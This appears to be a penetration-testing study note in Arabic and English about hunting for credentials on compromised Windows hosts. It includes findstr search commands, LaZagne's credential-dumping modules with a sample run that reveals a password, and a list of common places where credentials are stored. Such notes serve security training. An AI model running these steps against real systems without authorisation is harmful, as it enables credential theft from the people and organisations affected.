- اول ما ناخد access علي التارجت سواء GUI او CLI ممكن نعمل Credential Hunting
- عملية الCredential Hunting دي عملية ان انا اعمل research علي كل الملفات عشان اكتشف creds
---
## Search-centric
- مثلا انت دلوقتي مخترق جهاز الIT-admin فكر الراجل ده بيعمل ايه طول اليوم واجابة السؤال ده هيا اللي هتدلك علي الباسوردات المستخبيه ومكانها
- انت ك هاكر تركز علي اماكن زي
-Scripts and Configurations files
-Command History
-Password Managers
-Sticky Notes
-RDP files
- بس في بقي تكنيك حلو جدا اسمه search-centric وهو عباره عن انك بتستخدم اوامر البحث في الويندوز عشان تدور علي كلمات معينه زي 
-Passwords
-Passphrases
-Keys
-Username
-User account
-Creds
-Users
-Passkeys
-configuration
-dbcredential
-dbpassword
-pwd
-Login
-Credentials

```
findstr /si password *.txt *.xml *.ini
```
----
## Search tools
- لو احنا واخدين GUI access علي التارجت هنستخدم مثلا الWindows Search
![](Pasted%20image%2020260219011030.png)

#### LaZagne
- في تول زي LaZagne دي بتdiscover الcreds اللي المتصفح او اي تطبيقات insecure بتخزنها علي الجهاز
- الLaZagne فيها موديولات كتير علي حسب نوع الباسورد

|Module|Description|
|---|---|
|browsers|Extracts passwords from various browsers including Chromium, Firefox, Microsoft Edge, and Opera|
|chats|Extracts passwords from various chat applications including Skype|
|mails|Searches through mailboxes for passwords including Outlook and Thunderbird|
|memory|Dumps passwords from memory, targeting KeePass and LSASS|
|sysadmin|Extracts passwords from the configuration files of various sysadmin tools like OpenVPN and WinSCP|
|windows|Extracts Windows-specific credentials targeting LSA secrets, Credential Manager, and more|
|wifi|Dumps WiFi credentials|
اداة الLaZagne هيا standalone copy يعني ممكن تنسخها من جهازك كا فايل exe لجهاز الضحيه علاطول وتشتغل

```cmd-session
C:\Users\bob\Desktop> start LaZagne.exe all
```
all دي اللي بقوله شغل كل الموديولات

```cmd-session
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: bob ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: 10.129.202.51
Login: admin
Password: SteveisReallyCool123
Port: 22
```
في فلاج اسمها `-vv` ده بيوريك محاولات تجميع الباسوردات من الاماكن وكده وتشوف ايه اللي بيحصل فالكواليس
#### findstr
- ممكن نستخدم findstr عشان نسيرش بpatterns كتير ممكن توصلنا لباسورد
- 
```cmd-session
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

Here are some other places we should keep in mind when credential hunting:

- Passwords in Group Policy in the SYSVOL share
- Passwords in scripts in the SYSVOL share
- Password in scripts on IT shares
- Passwords in `web.config` files on dev machines and IT shares
- Password in `unattend.xml`
- Passwords in the AD user or computer description fields
- KeePass databases (if we are able to guess or crack the master password)
- Found on user systems and shares
- Files with names like `pass.txt`, `passwords.docx`, `passwords.xlsx` found on user systems, shares, and [Sharepoint](https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration)
----
